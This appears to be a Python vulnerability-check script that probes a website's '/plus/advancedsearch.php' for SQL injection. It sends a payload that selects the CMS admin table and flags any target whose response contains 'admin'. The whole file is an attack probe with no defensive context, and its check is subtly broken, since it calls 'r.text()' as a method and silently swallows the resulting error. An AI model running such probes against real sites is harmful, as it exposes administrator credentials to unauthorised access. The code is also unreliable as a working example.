import requests
from termcolor import cprint


class advancedsearch_sqli:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/advancedsearch.php?mid=1&sql=SELECT%20*%20FROM%20`%23@__admin"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and r"admin" in r.text():
                cprint("target may be advancedsearch.php SqlInject:" + vulnurl,"red")
        except:
            return False